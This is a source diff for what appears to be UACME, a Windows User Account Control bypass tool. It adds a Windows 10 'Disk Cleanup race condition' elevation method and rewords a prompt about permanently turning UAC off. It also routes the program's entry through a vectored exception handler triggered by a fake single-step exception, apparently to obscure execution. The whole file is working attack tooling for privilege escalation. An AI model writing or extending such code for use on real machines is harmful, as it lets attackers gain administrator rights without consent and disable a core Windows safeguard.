@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.53
+*  VERSION:     2.54
 *
-*  DATE:        18 Jan 2017
+*  DATE:        07 Feb 2017
 *
 *  Program entry point.
 *
@@ -23,6 +23,7 @@
 #pragma comment(lib, "comctl32.lib")
 
 UACMECONTEXT g_ctx;
+TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "=^_^=" };
 
 static pfnDecompressPayload pDecryptPayload = NULL;
 
@@ -145,7 +146,6 @@ UINT ucmInit(
 
         TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
             WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);
-
 
         //remember dll handles
         g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
@@ -524,6 +524,16 @@ UINT ucmMain()
 
     case UacMethodEnigma0x3:
         break;
+
+    case UacMethodEnigma0x3_2:
+#ifndef _DEBUG
+        if (g_ctx.dwBuildNumber < 10240) {
+            ucmShowMessage(WIN10ONLY);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        break;
+
     }
 
     //prepare command for payload
@@ -531,7 +541,10 @@ UINT ucmMain()
     RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
     GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
     if (paramLen > 0) {
-        if ((g_ctx.Method != UacMethodRedirectExe) && (g_ctx.Method != UacMethodComet)) {
+        if ((g_ctx.Method != UacMethodRedirectExe) && 
+            (g_ctx.Method != UacMethodComet) && 
+            (g_ctx.Method != UacMethodEnigma0x3)) 
+        {
             supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
         }
     }
@@ -579,7 +592,7 @@ UINT ucmMain()
         }
 #endif
         if (MessageBox(GetDesktopWindow(),
-            TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
+            TEXT("This method will permanently TURN UAC OFF, are you sure?"),
             PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES)
         {
             if (ucmSimdaTurnOffUac()) {
@@ -778,14 +791,75 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-        
+
+    case UacMethodEnigma0x3_2:
+        if (ucmDiskCleanupRaceCondition()) {
+            return ERROR_SUCCESS;
+        }
+        break;
+       
     }
 
     return ERROR_ACCESS_DENIED;
 }
 
+DWORD g_ExCookie = 0;
 
+LONG NTAPI ucmVehHandler(
+    EXCEPTION_POINTERS *ExceptionInfo
+)
+{
+    UACME_THREAD_CONTEXT *uctx;
+
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
+        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
+            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
+            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
+                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
+            }
+            if (uctx) {
+                if (uctx->ucmMain)
+                    uctx->ucmMain();
+            }
+            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+/*
+* main
+*
+* Purpose:
+*
+* Program entry point.
+*
+*/
 VOID main()
 {
-    ExitProcess(ucmMain());
+    PVOID ExceptionHandler;
+    DWORD k;
+    EXCEPTION_RECORD ex;
+    UACME_THREAD_CONTEXT uctx;
+
+    RtlSecureZeroMemory(&uctx, sizeof(uctx)); 
+
+    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
+    if (ExceptionHandler) {
+        uctx.Frame.Context = &g_fctx;
+        uctx.ucmMain = (pfnEntryPoint)ucmMain;
+        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
+
+        k = ~GetTickCount();
+        g_ExCookie = RtlRandomEx(&k);
+
+        RtlSecureZeroMemory(&ex, sizeof(ex));
+        ex.ExceptionFlags = g_ExCookie;
+        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
+        RtlRaiseException(&ex);
+
+        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
+        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
+    }
+    ExitProcess(0);
 }
